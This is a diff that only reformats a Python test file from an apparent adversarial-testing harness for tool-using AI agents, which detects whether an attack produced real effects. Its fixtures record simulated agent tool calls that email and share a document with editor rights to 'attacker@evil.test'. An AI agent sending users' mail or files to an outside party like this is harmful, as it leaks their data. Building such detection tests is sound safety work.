@@ -121,7 +121,9 @@ def test_mock_observer_creates_no_browser() -> None:
     assert isinstance(observer.snapshot().status, dict)
 
 
-def test_live_observer_reuses_context_and_opens_no_new_session(monkeypatch: pytest.MonkeyPatch) -> None:
+def test_live_observer_reuses_context_and_opens_no_new_session(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
     import advtest_ext.adapters._ui_mode_common.session as session_mod
 
     def _boom(*_a: Any, **_k: Any) -> Any:
@@ -134,7 +136,9 @@ def test_live_observer_reuses_context_and_opens_no_new_session(monkeypatch: pyte
     obs_state = asyncio.run(WorkspaceObserver(page=page, watched_doc_ids=()).snapshot())
     assert obs_state.status["mail_sent"] == "observed"  # scraped the reused page (empty)
     assert page.gotos  # it navigated the SAME page, not a new session
-    assert obs_state.status["files_shared"] == "unavailable"  # no API accelerator → no false negative
+    assert (
+        obs_state.status["files_shared"] == "unavailable"
+    )  # no API accelerator → no false negative
 
     # And via a session it opens tabs in the SAME context, never a new session.
     fake_session = _FakeSession()
@@ -149,13 +153,25 @@ def test_bridge_call_log_turns_tool_calls_into_deltas() -> None:
     from advtest_ext.adapters.tool_use_agent.tools import CallLog
 
     log = CallLog()
-    log.record("send_email", {"to": "attacker@evil.test", "subject": "x", "body": "b"}, "queued; message-id=msg-abc123")
-    log.record("share_document", {"doc_id": "docZ", "with_email": "attacker@evil.test", "role": "editor"}, "shared")
+    log.record(
+        "send_email",
+        {"to": "attacker@evil.test", "subject": "x", "body": "b"},
+        "queued; message-id=msg-abc123",
+    )
+    log.record(
+        "share_document",
+        {"doc_id": "docZ", "with_email": "attacker@evil.test", "role": "editor"},
+        "shared",
+    )
     log.record("create_calendar_event", {"title": "noise"}, "created")  # no observable delta
 
     post = bridge_call_log(log.calls)
     obs = diff_observation(state(), post)
 
-    assert obs.mail_sent == [MailItem(message_id="msg-abc123", recipient="attacker@evil.test", subject="x")]
-    assert obs.files_shared == [FileShare(file_id="docZ", principal="attacker@evil.test", scope="editor")]
+    assert obs.mail_sent == [
+        MailItem(message_id="msg-abc123", recipient="attacker@evil.test", subject="x")
+    ]
+    assert obs.files_shared == [
+        FileShare(file_id="docZ", principal="attacker@evil.test", scope="editor")
+    ]
     assert classify_observation(obs) == "effect_observed"
